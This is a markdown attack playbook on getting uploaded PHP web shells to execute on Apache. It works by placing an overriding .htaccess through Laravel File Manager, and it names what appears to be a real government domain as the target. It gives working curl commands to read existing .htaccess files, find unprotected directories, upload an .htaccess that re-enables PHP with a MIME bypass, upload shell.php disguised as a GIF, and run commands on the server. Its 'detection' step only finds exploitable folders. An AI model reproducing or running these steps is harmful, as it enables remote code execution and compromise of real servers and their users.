# Apache .htaccess Child-Override Technique

## Problem
Uploaded PHP shells land in `/storage/public/photos/` or `/storage/public/files/`.
Apache blocks access (403) because of `.htaccess` directives in parent directories.

## How Apache Processes .htaccess
Apache reads `.htaccess` files **per-directory** for each request:
1. Root `.htaccess` → `/var/www/html/.htaccess`
2. Parent `.htaccess` → `/storage/.htaccess`
3. Directory `.htaccess` → `/storage/public/.htaccess`
4. Child `.htaccess` → `/storage/public/files/.htaccess`

**Child directives OVERRIDE parent directives** when they conflict.

## The Pattern (nactvet.go.tz)

### Step 1: Read existing .htaccess
```
LFM download: /laravel-filemanager/download?type=Images&file=.htaccess
```
Content:
```apache
php_flag engine off
Options -Indexes -ExecCGI
<FilesMatch "\.(php|php5|phtml|phar|pl|py|jsp|asp|sh|cgi|php7|shtml|phps|PHP|php8|gif)$">
    Require all denied
</FilesMatch>
```

### Step 2: Find a directory WITHOUT .htaccess
`/storage/public/files/` has no `.htaccess` — confirmed via LFM download returning 404.

### Step 3: Upload overriding .htaccess via LFM
```bash
printf 'php_flag engine on\nRequire all granted\n<FilesMatch "\\.php$">\nRequire all granted\n</FilesMatch>\n' > /tmp/hta
curl -F "upload=@/tmp/hta;type=text/plain;filename=.htaccess" \
  "TARGET/laravel-filemanager/upload?type=Files&_token=CSRF"
```

### Step 4: Upload PHP shell to same directory
```bash
curl -F "upload=@/tmp/shell.php;type=image/gif;filename=shell.php" \
  "TARGET/laravel-filemanager/upload?type=Files&_token=CSRF"
```

### Step 5: Execute
```
TARGET/storage/public/files/shell.php?c=id
```

## Key Insight
- **Parent `.htaccess` says `php_flag engine off`** — but child `.htaccess` says `php_flag engine on` → child WINS
- **Parent blocks `.php` via FilesMatch** — but child grants `Require all granted` → child WINS
- This works because Apache checks per-directory from root to leaf, and the LAST matching directive takes precedence

## Prerequisites
- Upload capability (LFM, CMS, any file upload)
- A directory without its own `.htaccess`
- Ability to upload `.htaccess` file (may need MIME bypass — try `type=text/plain`)

## Detection
```bash
# Check if a directory has .htaccess
curl "TARGET/laravel-filemanager/download?type=Files&file=.htaccess" -w "%{http_code}"
# 200 = .htaccess exists, 404 = no .htaccess (exploitable!)
```
